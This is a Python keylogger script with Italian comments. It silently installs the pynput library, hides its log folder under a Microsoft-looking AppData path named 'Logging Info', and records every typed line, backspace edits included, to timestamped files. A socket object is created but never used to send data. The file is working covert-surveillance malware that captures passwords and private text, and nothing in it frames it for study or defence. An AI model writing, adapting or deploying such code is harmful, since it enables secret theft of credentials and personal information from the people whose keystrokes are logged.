import socket
import os
from threading import Thread, local
from time import localtime, strftime
try:
    import pynput
except ImportError:
    os.system('python -m pip install pynput')

outpath='C:\\Users\\'+os.getlogin()+'\\AppData\\Roaming\\Microsoft\\Logging Info'

keys = []
deleted = {}
username = os.getlogin()
ClientMultiSocket = socket.socket()

if not os.path.exists(outpath):
    os.makedirs(outpath)
log_file = open(os.path.join(outpath,strftime("log-%Y%m%d %H-%M-%S", localtime())) , "w")
def start():
    from pynput.keyboard import Key, Listener

    def sendOutput(msg):
        print(msg)
        log_file.write(str(msg+"\n"))
        log_file.flush()

    def on_press(key):
        global keys
        #global deleted

        # SE TAB O INVIO
        if key == Key.enter or key == Key.tab:
            if len(keys)+len(deleted) > 0:
                try:
                    sendOutput(''.join(keys))
                except:
                    sendOutput(str(keys))
                # print((deleted))
                keys = []
                #deleted = {}

        # SE SPAZIO
        elif key == Key.space:
            keys.append(' ')

        # SE CANCELLO
        elif key == Key.backspace:
            if len(keys) > 0:
                keys.pop(len(keys)-1)
                # removed =
                #deleted[len(keys)] = removed

        # tutti i tasti speciali
        elif key == Key.esc or key == Key.shift or key == Key.ctrl_l or key == Key.caps_lock or key == Key.cmd or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.left or key == Key.down or key == Key.right or key == Key.up or key == Key.insert or key == Key.delete or key == Key.end or key == Key.home or key == Key.page_down or key == Key.page_up or key == Key.num_lock or key == Key.num_lock or key == Key.pause or key == Key.scroll_lock or key == Key.print_screen or key == Key.scroll_lock or key == Key.f12 or key == Key.f11 or key == Key.f10 or key == Key.f9 or key == Key.f8 or key == Key.f7 or key == Key.f6 or key == Key.f5 or key == Key.f4 or key == Key.f3 or key == Key.f2 or key == Key.f1:
            pass

        # se è del tastierino numerico o combinazione con ctrl
        elif hasattr(key, 'vk') and 96 <= key.vk <= 105:
            keys.append(str(key.vk-96))

        else:
            try:
                if key.char != None:
                    keys.append(key.char)
            except:
                pass

    def on_release(key):
        if key == Key.esc:
            return False
        # pass


    def on_click(x, y, button, pressed):
        print('{0} at {1}'.format(
            'Pressed' if pressed else 'Released',
            (x, y)))
        if not pressed:
            # Stop listener
            return False

    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    ClientMultiSocket.close()


t = Thread(target=start)
t.start()
